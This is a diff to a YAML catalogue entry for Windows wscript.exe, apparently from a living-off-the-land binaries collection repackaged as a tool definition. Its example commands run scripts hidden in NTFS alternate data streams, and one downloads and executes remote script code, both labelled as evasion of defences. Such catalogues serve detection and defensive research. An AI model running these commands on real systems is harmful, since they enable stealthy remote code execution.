@@ -2,7 +2,8 @@
 id: windows-ads-wscript
 namespace: windows:ads:wscript
 name: wscript
-description: 'Used by Windows to execute scripts Located at: C:\Windows\System32\wscript.exe; C:\Windows\SysWOW64\wscript.exe.'
+description: 'Used by Windows to execute scripts Located at: C:\Windows\System32\wscript.exe;
+  C:\Windows\SysWOW64\wscript.exe.'
 author: Oddvar Moe
 version: 1.0.0
 capabilities:
@@ -41,7 +42,13 @@ resource_profile:
 allowed-tools:
 - wscript
 parameters: []
-features: []
+features:
+- file-system
+- local
+- pipes-stdin
+- pipes-stdout
+- process-manip
+- streaming
 execution:
   template: wscript
   sandbox: execFile
@@ -49,10 +56,13 @@ execution:
   shell: false
 global_vars: {}
 examples:
-- description: Execute script stored in an alternate data stream (Execute hidden code to evade defensive counter measures)
+- description: Execute script stored in an alternate data stream (Execute hidden code
+    to evade defensive counter measures)
   command: wscript //e:vbscript {PATH}:script.vbs
-- description: Download and execute script stored in an alternate data stream (Execute hidden code to evade defensive counter measures)
-  command: echo GetObject("script:{REMOTEURL:.js}") > {PATH_ABSOLUTE}:hi.js && wscript.exe {PATH_ABSOLUTE}:hi.js
+- description: Download and execute script stored in an alternate data stream (Execute
+    hidden code to evade defensive counter measures)
+  command: echo GetObject("script:{REMOTEURL:.js}") > {PATH_ABSOLUTE}:hi.js && wscript.exe
+    {PATH_ABSOLUTE}:hi.js
 references:
 - label: cdd2d0d0ec9abb686f0e89306e277b8f
   url: https://gist.github.com/api0cradle/cdd2d0d0ec9abb686f0e89306e277b8f
@@ -89,7 +99,6 @@ install:
   commands:
   - choco install wscript
 ---
-
 
 # wscript
 
